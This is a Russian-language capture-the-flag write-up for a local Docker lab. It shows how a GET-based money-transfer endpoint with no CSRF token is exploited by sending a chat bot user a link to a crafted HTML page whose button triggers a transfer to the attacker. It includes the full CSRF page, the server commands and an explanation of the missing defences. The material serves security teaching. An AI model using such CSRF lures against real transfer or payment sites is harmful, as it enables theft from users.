# Решение CSRF Money Lab

## Цель

Нужно заставить пользователя `rich` перевести деньги на наш аккаунт, а затем купить секретный товар с флагом.

## 1. Регистрация и поиск перевода денег

Запускаем приложение:

```bash
sudo docker pull nshkilevich/csrfmoney-lab:latest

sudo docker run -d \
  --name csrf-money-lab \
  -p 127.0.0.1:8086:8080 \
  --add-host host.docker.internal:host-gateway \
  --restart unless-stopped \
  nshkilevich/csrfmoney-lab:latest
```

Регистрируем нового пользователя. После входа изучаем функционал приложения.

В магазине видим секретный товар `flag`, но у нового пользователя только `$10 000`, поэтому купить его не получится.

Дальше находим вкладку `Перевод`. В ней есть форма отправки денег другому пользователю.

После пробного перевода можно увидеть, что запрос уходит на URL вида:

```text
/transfer?to=<login>&amount=<sum>
```

Это подозрительно, потому что перевод денег выполняется обычным GET-запросом. Если для такого действия нет CSRF-токена, другой сайт может заставить браузер авторизованного пользователя открыть этот URL.

## 2. Поиск чата

Находим вкладку `Чат`.

В чате можно отправлять сообщения пользователям. В списке получателей есть пользователь:

```text
rich
```

Предполагаем, что через чат можно эксплуатировать CSRF-уязвимость: отправить пользователю `rich` ссылку на нашу страницу, где будет кнопка для перевода денег.

Бот `rich` открывает ссылки из сообщений и нажимает кнопки на открытых страницах. Значит, если кнопка ведёт на `/transfer`, перевод выполнится от имени `rich`.

## 3. Создаём CSRF-страницу

Создаём файл `csrf.html`:

```html
<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <title>Подарок</title>
</head>
<body>
  <h1>Получить подарок</h1>
  <button onclick="location.href='http://127.0.0.1:8080/transfer?to=student&amount=1000000'">
    Получить
  </button>
</body>
</html>
```

Вместо `student` нужно указать логин своего пользователя.

Например, если ваш логин `hacker`, ссылка должна быть такой:

```html
<button onclick="location.href='http://127.0.0.1:8080/transfer?to=hacker&amount=1000000'">
  Получить
</button>
```

## 4. Поднимаем сервер со страницей

Переходим в директорию, где лежит файл `csrf.html`, и запускаем простой HTTP-сервер:

```bash
python3 -m http.server 8040
```

Теперь файл будет доступен по адресу:

```text
http://<IP_вашей_машины>:8040/csrf.html
```

IP тачки можно узнать из команды

```bash
ip add
```

Если приложение запущено в Docker, для бота удобно использовать адрес:

```text
http://host.docker.internal:8040/csrf.html
```

>Это связано с особенностями развертки на локальной машине. Во время соревнований поднимается профессиональная архитектура, которая позволяет общаться сервисам используя выделенные IP адреса. В этих случаях в качестве ловушки кидаем свой IP

## 5. Отправляем ссылку rich

Возвращаемся в приложение и открываем вкладку `Чат`.

Отправляем пользователю `rich` ссылку:

```text
http://host.docker.internal:8040/csrf.html
```

Бот `rich` откроет страницу и нажмёт кнопку `Получить`.

После клика браузер `rich` перейдёт по ссылке:

```text
http://127.0.0.1:8080/transfer?to=<ваш_логин>&amount=1000000
```

Так как запрос выполняется из браузера `rich`, к нему автоматически прикладывается cookie пользователя `rich`. Сервер считает, что перевод сделал сам `rich`.

## 6. Проверяем перевод и покупаем флаг

После отправки ссылки обновляем страницу магазина или профиля своего пользователя.

Баланс должен увеличиться на:

```text
$1 000 000
```

После этого возвращаемся в магазин и покупаем секретный товар `flag`.

После успешной покупки приложение покажет флаг

## Почему атака сработала

Перевод денег реализован через GET-запрос:

```text
/transfer?to=<login>&amount=<sum>
```

Сервер проверяет только наличие session-cookie, но не проверяет намерение пользователя выполнить перевод.

На странице нет CSRF-токена, нет повторного подтверждения и нет проверки источника запроса. Поэтому внешняя страница с кнопкой может отправить браузер `rich` на URL перевода, а браузер автоматически приложит cookie `rich`.
